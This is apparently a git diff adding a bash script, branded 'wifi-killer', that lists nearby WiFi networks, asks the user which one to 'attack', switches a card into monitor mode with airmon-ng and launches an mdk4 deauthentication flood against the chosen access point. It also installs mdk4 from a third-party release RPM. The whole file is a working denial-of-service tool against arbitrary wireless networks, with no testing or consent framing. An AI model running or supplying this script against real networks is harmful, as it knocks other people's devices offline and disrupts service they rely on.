@@ -1,0 +1,193 @@
+#!/bin/bash
+if [ "$(id -u)" -ne 0 ]; then
+	echo "This script must be run as root"
+	exit 1
+fi                                                                                 
+
+# Check if aircrack-ng is installed
+if ! command -v aircrack-ng &>/dev/null; then
+    echo "aircrrack-ng not found – installing via dnf…"
+    sudo dnf install -y aircrack-ng
+fi
+# Check if mdk4 is installed
+if ! command -v mdk4 &>/dev/null; then
+    echo "mdk4 not found – installing via dnf…"
+    sudo dnf install -y https://github.com/MrScratchcat/mdk4-fedora/releases/download/mdk4-v0.1/mdk4-4.2-1.f42.x86_64.rpm
+fi
+
+clear
+echo "                  ███     ██████   ███             █████       ███  ████  ████                    "
+echo "                 ░░░     ███░░███ ░░░             ░░███       ░░░  ░░███ ░░███                    "
+echo " █████ ███ █████ ████   ░███ ░░░  ████             ░███ █████ ████  ░███  ░███   ██████  ████████ "
+echo "░░███ ░███░░███ ░░███  ███████   ░░███  ██████████ ░███░░███ ░░███  ░███  ░███  ███░░███░░███░░███"
+echo " ░███ ░███ ░███  ░███ ░░░███░     ░███ ░░░░░░░░░░  ░██████░   ░███  ░███  ░███ ░███████  ░███ ░░░ "
+echo " ░░███████████   ░███   ░███      ░███             ░███░░███  ░███  ░███  ░███ ░███░░░   ░███     "
+echo "  ░░████░████    █████  █████     █████            ████ █████ █████ █████ █████░░██████  █████    "
+echo "   ░░░░ ░░░░    ░░░░░  ░░░░░     ░░░░░            ░░░░ ░░░░░ ░░░░░ ░░░░░ ░░░░░  ░░░░░░  ░░░░░     "
+                                                                                                                                                                                                    
+echo "made by MrScratchcat using mdk4"
+echo ""
+echo "Please pick a WiFi Card that supports monitor mode:"
+
+
+# Use the 'iwconfig' command to list wireless interfaces
+wifi_cards=($(nmcli -t -f DEVICE,TYPE device | grep ':wifi$' | cut -d: -f1))
+
+# Display the available WiFi cards with numbers
+for ((i=0; i<${#wifi_cards[@]}; i++)); do
+    echo "$((i+1)). ${wifi_cards[i]}"
+done
+
+echo "Enter the number of the WiFi card you want to use:"
+read selection
+
+# Validate the selection
+if [[ $selection -ge 1 && $selection -le ${#wifi_cards[@]} ]]; then
+    selected_wifi_card="${wifi_cards[selection-1]}"
+    echo "You selected: $selected_wifi_card"
+else
+    echo "Invalid selection. Please enter a valid number."
+fi
+
+# Check if NetworkManager is running
+if ! systemctl is-active --quiet NetworkManager; then
+    # Start NetworkManager if it's not running
+    echo "NetworkManager is not running starting now..."
+    sudo systemctl start NetworkManager
+    echo "NetworkManager has been started."
+else
+    echo "NetworkManager is already running."
+fi
+
+if sudo nmcli device set $selected_wifi_card managed yes 2>/dev/null; then
+    echo "Wireless interface $selected_wifi_card set to managed mode."
+else
+    echo "Error setting wireless interface to managed mode."
+fi
+
+clear
+# List available WiFi network names (SSIDs) with corresponding numbers
+echo "Please wait for available WiFi Networks:"
+# Use awk to properly parse fields considering spaces in SSID
+wifi_list=$(nmcli -f SSID,BSSID,CHAN dev wifi list | tail -n +2 | awk 'NF>=3 && $1 != "--" {
+    ssid=$1
+    bssid=$(NF-1)
+    chan=$NF
+    for(i=2; i<NF-1; i++) ssid=ssid" "$i
+    printf "%s|%s|%s\n", ssid, bssid, chan
+}')
+
+num=1
+echo "$wifi_list" | while IFS='|' read -r ssid bssid chan; do
+    echo "$num. $ssid (BSSID: $bssid, Channel: $chan)"
+    num=$((num + 1))
+done
+
+# Prompt the user to select a network by number
+read -p "Enter the number of the WiFi network you want to attack: " selected_num
+
+# Validate the selected number
+if ! [[ "$selected_num" =~ ^[0-9]+$ ]]; then
+    echo "Invalid input. Please enter a valid number."
+    exit 1
+fi
+
+# Get total count
+total_networks=$(echo "$wifi_list" | wc -l)
+
+# Check if the selected number is within a valid range
+if [ "$selected_num" -ge 1 ] && [ "$selected_num" -le "$total_networks" ]; then
+    selected_line=$(echo "$wifi_list" | sed -n "${selected_num}p")
+    selected_network=$(echo "$selected_line" | cut -d'|' -f1)
+    selected_bssid=$(echo "$selected_line" | cut -d'|' -f2)
+    channel=$(echo "$selected_line" | cut -d'|' -f3)
+    echo "Selected WiFi network: $selected_network"
+    echo "BSSID: $selected_bssid"
+    echo "Channel: $channel"
+else
+    echo "Invalid selection. Please choose a valid number."
+    exit 1
+fi
+
+clear
+
+# Disconnect before switching to monitor mode
+nmcli device disconnect $selected_wifi_card 2>/dev/null
+
+# Set the wireless interface to monitor mode using airmon-ng
+airmon_output=$(sudo airmon-ng start $selected_wifi_card 2>&1)
+if [ $? -eq 0 ]; then
+    echo "Wireless interface $selected_wifi_card set to monitor mode."
+    # Extract the actual monitor interface name from airmon-ng output
+    monitor_interface=$(echo "$airmon_output" | grep -oP '(?<=\(monitor mode enabled on )\w+(?=\))' | tail -1)
+    if [ -z "$monitor_interface" ]; then
+        # Fallback: check if original interface is now in monitor mode
+        if iw dev "$selected_wifi_card" info 2>/dev/null | grep -q "type monitor"; then
+            monitor_interface="$selected_wifi_card"
+        elif ip link show "${selected_wifi_card}mon" &>/dev/null; then
+            monitor_interface="${selected_wifi_card}mon"
+        else
+            monitor_interface=$(iw dev | grep -A1 "Interface" | grep "type monitor" -B1 | grep "Interface" | awk '{print $2}')
+        fi
+    fi
+    echo "Monitor interface: $monitor_interface"
+else
+    echo "Error setting wireless interface to monitor mode. Running airmon-ng check kill..."
+    sudo airmon-ng check kill
+    echo "Attempting to set monitor mode again..."
+    airmon_output=$(sudo airmon-ng start $selected_wifi_card 2>&1)
+    if [ $? -eq 0 ]; then
+        echo "Wireless interface $selected_wifi_card set to monitor mode."
+        monitor_interface=$(echo "$airmon_output" | grep -oP '(?<=\(monitor mode enabled on )\w+(?=\))' | tail -1)
+        if [ -z "$monitor_interface" ]; then
+            if iw dev "$selected_wifi_card" info 2>/dev/null | grep -q "type monitor"; then
+                monitor_interface="$selected_wifi_card"
+            elif ip link show "${selected_wifi_card}mon" &>/dev/null; then
+                monitor_interface="${selected_wifi_card}mon"
+            else
+                monitor_interface=$(iw dev | grep -A1 "Interface" | grep "type monitor" -B1 | grep "Interface" | awk '{print $2}')
+            fi
+        fi
+        echo "Monitor interface: $monitor_interface"
+    else
+        echo "Error: Unable to set wireless interface to monitor mode even after running airmon-ng check kill."
+        exit
+    fi
+fi
+
+# Verify the monitor interface exists
+if ! ip link show "$monitor_interface" &>/dev/null; then
+    echo "Error: Monitor interface $monitor_interface does not exist."
+    echo "Available interfaces:"
+    iw dev
+    exit 1
+fi
+
+clear
+# Check if the network was found and display the channel if available
+if [ -n "$selected_bssid" ] && [ -n "$channel" ]; then
+    echo "Starting deauth attack on $selected_network"
+    echo "BSSID: $selected_bssid"
+    echo "Channel: $channel"
+    echo "Monitor Interface: $monitor_interface"
+    echo ""
+    echo "Press Ctrl+C to stop the attack"
+    echo ""
+    
+    # Set the monitor interface to the correct channel first
+    sudo iw dev $monitor_interface set channel $channel
+    
+    echo "Interface set to channel $channel"
+    echo "Starting deauth flood..."
+    echo ""
+    
+    # Use -B flag for target BSSID and -c for channel, with speed limit
+    sudo mdk4 $monitor_interface d -B $selected_bssid -c $channel -s 500
+    
+else
+    echo "Network '$selected_network' not found or unable to retrieve BSSID/channel information."
+    echo "BSSID: $selected_bssid"
+    echo "Channel: $channel"
+fi
+sudo airmon-ng stop $monitor_interface 2>/dev/null
+sudo systemctl start NetworkManager
